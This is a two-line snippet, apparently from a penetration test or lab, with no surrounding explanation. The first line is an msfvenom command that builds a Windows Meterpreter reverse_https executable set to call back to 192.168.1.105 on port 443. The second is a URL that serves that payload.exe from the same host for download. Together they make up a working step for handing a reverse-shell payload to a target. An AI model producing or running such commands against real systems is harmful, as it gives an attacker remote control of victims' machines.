msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.105 LPORT=443 -f exe -o ~/payload.exe
http://192.168.1.105:8080/payload.exe
